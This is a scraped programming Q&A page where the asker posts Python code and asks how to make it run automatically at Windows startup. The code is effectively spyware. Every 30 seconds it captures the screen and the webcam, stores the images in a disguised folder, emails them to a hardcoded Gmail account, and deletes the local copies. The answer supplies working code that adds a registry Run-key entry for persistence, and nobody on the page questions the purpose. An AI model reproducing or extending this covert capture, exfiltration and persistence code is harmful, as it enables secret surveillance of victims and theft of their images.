<div class="post-text" itemprop="text">
<p>I have wrote the following program. I made its setup. It installed successfully. Now, I want my program to start at startup without manually copying its shortcut to startup folder i.e <strong>C:\Users\User\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup</strong>. </p>
<p>I would like my program to run automatically at startup like many commercial programs (like utorrent, Internet Downloader Manager, etc) do. How can I do that?</p>
<p><strong>Python Code:</strong></p>
<pre><code>import os
import time
import string
import random
import shutil
import smtplib
import pyautogui 
from SimpleCV import Image, Camera
from email.mime.text import MIMEText
from email.mime.image import MIMEImage
from email.mime.multipart import MIMEMultipart

def make_folder():   #Checking if $y$temF0lder exists in C drive
    if os.path.exists('C:\\$y$temF0lder'):
        pass
    else:
        os.mkdir('C:\\$y$temF0lder')
    os.chdir('C:\\$y$temF0lder')

cam = Camera()

def send_mail():  #Sending captured picture in my email
    msg = MIMEMultipart()
    fromadd = 'fromadd@gmail.com'
    toadd = 'toadd@gmail.com'
    msg['From'] = fromadd
    msg['To'] = toadd
    msg['Subject'] = 'Photos'
    text = MIMEText('Pic')
    msg.attach(text)
    screenshot_data = open(screenshot_name, 'rb').read()
    webcam_data = open(webcam_name, 'rb').read()
    send_image = MIMEImage(screenshot_data,
    name=os.path.basename(screenshot_name))
    send_images = MIMEImage(webcam_data, name=os.path.basename(webcam_name))
    msg.attach(send_image)
    msg.attach(send_images)
    sessions = smtplib.SMTP('smtp.gmail.com', '587')
    sessions.ehlo()
    sessions.starttls()
    sessions.ehlo()
    sessions.login(fromadd, 'P@ssword')
    sessions.sendmail(fromadd, toadd, msg.as_string())
    sessions.quit()

def main():
    global screenshot_name
    global webcam_name

    while True:
        make_folder()
        name = ''
        for i in range(10):  #Generating random name of 10 character long
            x = random.randint(0,62)
            name += string.printable[x]

        screenshot_name = 'Screenshot ' + name + '.png'
        webcam_name = 'Webcam ' + name + '.jpg'

        screenshot = pyautogui.screenshot()
        screenshot.save(screenshot_name)  

        web_pic = cam.getImage()
        web_pic.save(webcam_name)

        send_mail()

        for file in os.listdir('C:\\$y$temF0lder'):
            os.remove(file)

        time.sleep(30)
        shutil.rmtree('C:\\$y$temF0lder')

if __name__ == '__main__':
    main()
</code></pre>
</div>
<div class="post-text" itemprop="text">
<p>To avoid adding it to the startup folder, you can place your file elsewhere and create a Registry Key in the current user's startup Registry folder. To do soâ€”utilize the <a href="https://docs.python.org/3/library/winreg.html" rel="nofollow noreferrer"><code>winreg</code></a> module. It's well documented and fun to use!</p>
<blockquote>
<p><a href="http://winreg.CreateKeyEx" rel="nofollow noreferrer">winreg.CreateKeyEx(key, sub_key, reserved=0, access=KEY_WRITE)</a><br/>
<a href="https://docs.python.org/3/library/winreg.html#winreg.SetValueEx" rel="nofollow noreferrer">winreg.SetValueEx(key, value_name, reserved, type, value)</a><br/>
<a href="https://docs.python.org/3/library/winreg.html#winreg.PyHKEY.Close" rel="nofollow noreferrer">winreg.Close()</a> </p>
</blockquote>
<h3>Basic Usage</h3>
<pre><code>import winreg

def create_key(name: str="default", path: ""=str)-&gt;bool:
    # initialize key (create) or open
    reg_key = winreg.CreateKeyEx(winreg.HKEY_CURRENT_USER, # path current user
                                 r'Software\Microsoft\Windows\CurrentVersion\Run', # sub path startup
                                 0, # reserved (must be zero, default is 0)
                                 winreg.KEY_WRITE) # set permission to write

    # CreateKey returns a handle
    # if null it failed
    if not reg_key:
        return False

    # set the value of created key
    winreg.SetValueEx(reg_key, # key
        name,                  # value name
        0,                     # reserved (must be zero, default is 0)
        winreg.REG_SZ,     # REG_SZ - null-terminated string (for file path)
        path) # set file path

    # close key (think of it as opening a file)
    reg_key.Close()
    return True

if create_key("startup_batch", r"C:\Users\admin\Desktop\test.bat"):
    print("Added startup key.")
else:
    print("Failed to add startup key.")
</code></pre>
<p>Coded with version <code>3.6.4</code>.</p>
</div>
<span class="comment-copy">wait, is your question about the code, or about automating tasks in Windows?</span>
<span class="comment-copy">i think he's asking what python code to add that will run this script on startup.</span>
<span class="comment-copy">There is a startup folder in windows. put the links to programs simply there and it will start on startup</span>
<span class="comment-copy">@sgerodes "I want my program start at startup without manually copying its shortcut to startup folder"</span>
<span class="comment-copy">why not? That is what it is created for. I my thought it is faster to copy some shortcuts than to write a program. There is a Developer wisdom that sounds something like "do not do something that already is done"</span>
<span class="comment-copy">Thank you for your support.</span>
